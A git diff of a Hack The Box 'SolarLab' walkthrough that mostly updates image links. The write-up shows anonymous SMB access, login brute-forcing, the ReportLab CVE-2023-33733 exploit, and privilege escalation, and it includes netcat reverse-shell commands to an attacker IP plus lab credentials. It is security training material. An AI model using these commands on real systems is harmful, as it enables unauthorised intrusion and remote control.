@@ -5,8 +5,11 @@ tags:
   - htb
   - windows
   - medium
+  - reportlab
+  - runascs
+  - openfire
 ---
-pic here
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/SolarLab.png)
 
 ## Information Gathering
 ### Rustscan
@@ -45,43 +48,43 @@ Nmap done: 1 IP address (1 host up) scanned in 2.75 seconds
 ### HTTP - TCP 80
 After adding **solarlab.htb** to `/etc/hosts`, we can access the website:
 
-![alt text](image-1.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-1.png)
 
 Scrolling down a bit, we see employee names on the website:
 
-![alt text](image-7.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-7.png)
 
 ### report.solarlab.htb - TCP 6791
 
 When we try to access port 6791 through the web browser, it directs us to **report.solarlab.htb**:
 
-![alt text](image-2.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-2.png)
 
 After adding **report.solarlab.htb** to `/etc/hosts`, we can access it.
 
 The website shows a login portal:
 
-![alt text](image-3.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-3.png)
 
 ### SMB - TCP 445
 Luckily, we are able to list shares with no login credentials:
 
 `smbclient -N -L \\10.10.11.16`
 
-![alt text](image.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image.png)
 
 `/Documents` is accessible with no credentials:
 
-![alt text](image-4.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-4.png)
 
 Let's recursively download all the content inside of it:
 
-![alt text](image-5.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-5.png)
 
 
 **details-file.xlsx** reveals bunch of information including usernames and passwords:
 
-![alt text](image-6.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-6.png)
 
 Let's organize information found:
 
@@ -103,19 +106,19 @@ Using the discovered list of usernames and passwords, we can attempt bruteforce 
 
 It seems that Burp Suite bruteforce results either show length of **2403** or **2414**:
 
-![alt text](image-8.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-8.png)
 
 **2403** indicates that the user was not found:
 
-![alt text](image-9.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-9.png)
 
 **2414** indicates that the user was found but password was wrong:
 
-![alt text](image-10.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-10.png)
 
-Since **2403** means the user is not found, let's filter search only for **2414** and see what users are found:
+Since **2403** means the user is not found, let's filter search only for **2414** and see what users are found to be valid:
 
-![alt text](image-11.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-11.png)
 
 It seems that we have valid list of users:
 
@@ -126,13 +129,13 @@ This username is following the convention of **Firstname**.**initial_of_lastname
 
 Let's try bruteforcing again by with user **Blake Byte** added to the list with the username of **BlakeB**.
 
-![alt text](image-12.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-12.png)
 
 We get a valid match -> **BlakeB:ThisCanB3typedeasily1@**
 
 Using the credentials, we can login as BlakeB and we are directed to `/dashboard`:
 
-![alt text](image-36.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-36.png)
 
 ### ReportHub Enumeration
 
@@ -145,30 +148,27 @@ At **report.solarlab.htb**, there are four paths:
 
 Each of them shows a different but similar form as such:
 
-![alt text](image-13.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-13.png)
 
 After filling in the form, clicking on **Generate PDF** will create a PDF file as such:
 
-![alt text](image-15.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-15.png)
 
 Let's download the PDF and see what platform the website is using to generate PDF:
 
 `exiftool output.pdf`
 
-![alt text](image-16.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-16.png)
 
 **report.solarlab.htb** is using **ReportLab** for geerating PDFs.
 
 ## ReportLab RCE
 
-Goolging for ReportLab vulnerability, it seems that there's an [RCE vulnerability](https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897
-) for it:
+Goolging for ReportLab vulnerability, it seems that there's an [RCE vulnerability](https://security.snyk.io/vuln/SNYK-PYTHON-REPORTLAB-5664897) for it:
 
-![alt text](image-17.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-17.png)
 
 [CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733/tree/master) will allow us to exploit RCE.
-
-
 
 We can use the following payload to execute commands on the target:
 
@@ -183,33 +183,33 @@ build_document(doc, content)
 
 In order to spawn a reverse shell, let's use [revshells.com](https://www.revshells.com/) and generate powershell reverse shell payload encoded with Base64:
 
-![alt text](image-22.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-22.png)
 
 Now, let's intercept any of the **Generate PDF** request through Burp Suite.
 
 We will modifying the part where we indicate **training_request**:
 
-![alt text](image-20.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-20.png)
 
 Now let's copy paste the payload from revshell.com as such:
 
-![alt text](image-21.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-21.png)
 
 Forwarding the request, we get reverse shell connection on our netcat listener as Blake:
 
-![alt text](image-18.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-18.png)
 
 ## Privesc: blake to openfire
 
 `net users` command shows a user **openfire**.
 
-![alt text](image-23.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-23.png)
 
-This is interesting, we might need to escalate into openfire user before Administrator.
+This is interesting. We might need to escalate into openfire user before Administrator.
 
 Looking around **blake**'s home directory, there's a interesting file named **users.db**:
 
-![alt text](image-24.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-24.png)
 
 **users.db** reveals bunch of potential credentials:
 
@@ -219,7 +219,7 @@ Looking around **blake**'s home directory, there's a interesting file named **us
 | claudias    | 007poiuytrewq            |
 | blakeb      | ThisCanB3typedeasily1@   |
 
-![alt text](image-25.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-25.png)
 
 
 
@@ -230,58 +230,58 @@ Looking around **blake**'s home directory, there's a interesting file named **us
 
 Let's upload **RunasCs.exe** to the target using the command `impacket-smbserver share -smb2support $(pwd)` and `copy \\10.10.14.13\share\RunasCs.exe .`:
 
-![alt text](image-27.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-27.png)
 
 One of passwords found from **users.db** was being reused for user **openfire** and we can execute commands as user openfire using RunaCs.exe:
 
 `.\RunasCs.exe openfire HotP!fireguard "whoami"`
 
-![alt text](image-29.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-29.png)
 
 
 Now, in order to spawn reverse shell as **openfire**, let's upload **nc.exe**:
 
-![alt text](image-28.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-28.png)
 
-Runing `.\RunasCs.exe openfire HotP!fireguard "C:\tmp\nc.exe 10.10.14.13 1234 -e powershell"`, we get a reverse shell as openfire on our netcat listener:
+Running `.\RunasCs.exe openfire HotP!fireguard "C:\tmp\nc.exe 10.10.14.13 1234 -e powershell"`, we get a reverse shell as openfire on our netcat listener:
 
-![alt text](image-30.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-30.png)
 
 ## Privesc: openfire to administrator
 
 In `C:\Progra Files\Openfire`, there's a directory named **embedded-db**:
 
-![alt text](image-31.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-31.png)
 
 Inside **embedded-db**, there's **openfire.script**, and it contains encrypted password along with the decryption key.
 
 Below is the part where it contains the encrypted password:
 
-![alt text](image-32.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-32.png)
 
 Below shows the part with decryption key:
 
-![alt text](image-33.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-33.png)
 
 
 
 ### Openfire Password Decrypt
 Using [Openfire_decrypt](https://github.com/c0rdis/openfire_decrypt), we can easily decrypt the password using the password key:
 
-pic here
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/s1.png)
 
 
 Password is cracked to be **ThisPasswordShouldDo!@**.
 
 Again, using **RunasCs.exe**, we can run commands as the administrator:
 
-![alt text](image-34.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-34.png)
 
 Similarly, reverse shell can be spawned as the administrator:
 
 `./RunasCs.exe administrator ThisPasswordShouldDo!@ "C:\tmp\nc.exe 10.10.14.13 1339 -e powershell"`
 
-![alt text](image-35.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/solarlab/image-35.png)
 
 ## References
 - https://github.com/antonioCoco/RunasCs/releases
